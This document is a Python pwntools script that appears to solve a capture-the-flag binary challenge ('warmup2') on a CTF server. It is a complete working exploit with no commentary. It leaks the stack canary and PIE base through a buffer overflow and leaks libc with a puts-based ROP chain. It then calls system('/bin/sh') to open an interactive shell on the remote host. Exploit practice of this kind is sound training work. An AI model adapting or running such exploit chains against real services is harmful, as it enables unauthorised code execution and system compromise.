from pwn import *

r = remote("warmup2.ctf.maplebacon.org" ,1337)
#====================================================GADGETS===============================================================
pop_rdi = 0x0000000000001353
ret = 0x000000000000101a
#==========================================================================================================================
#r = process("./chal")
e = ELF("./chal")
libc = ELF("./libc.so.6")
exploit = b"A" * 260 + b"B" * 4 + b"C"
r.sendafter("What's your name?\n",exploit)
r.recvuntil(b"BBBB")
temp = r.recvuntil(b"\x7f")
canary = u64(temp[0:8]) - 0x43 
log.info(f"[LEAK] stack cookie: {hex(canary)}")
exploit = b"A" * 264 + p64(canary) + b"A" * 8 + p8(0xa3)
r.sendafter("How old are you?\n",exploit)
exploit = b"A" * 264 + p64(canary+0x41) + b"B" * 8
r.sendafter("What's your name?\n",exploit)
r.recvuntil(b"BBBBBBBB")
temp = r.recvuntil("!")
temp = temp[0:len(temp)-1] + b"\x00" * 2
pie_base = u64(temp) - 0x012e2
log.info(f"[LEAK] pie base: {hex(pie_base)}")
exploit = b"A" * 264 + p64(canary) + b"A" * 8 + p64(pie_base + pop_rdi) + p64(pie_base + e.got.puts) + p64(pie_base + e.plt.puts) + p64(pie_base + ret) * 2 + p64(pie_base + e.sym.main)
r.sendafter("How old are you?\n",exploit)
r.recvuntil(b"too!\n")
libc_leak = u64(r.recvuntil(b"\x7f") + b"\x00" * 2)
libc_base = libc_leak - libc.sym.puts
log.info(f"[LEAK] libc base: {hex(libc_base)}")
exploit = b"A" * 264 + p64(canary) + b"A" * 8 + p64(pie_base + pop_rdi) + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(pie_base + ret) + p64(libc_base + libc.sym.system)
r.sendafter("What's your name?\n",exploit)
r.sendafter("How old are you?\n",b"lol")
r.interactive()
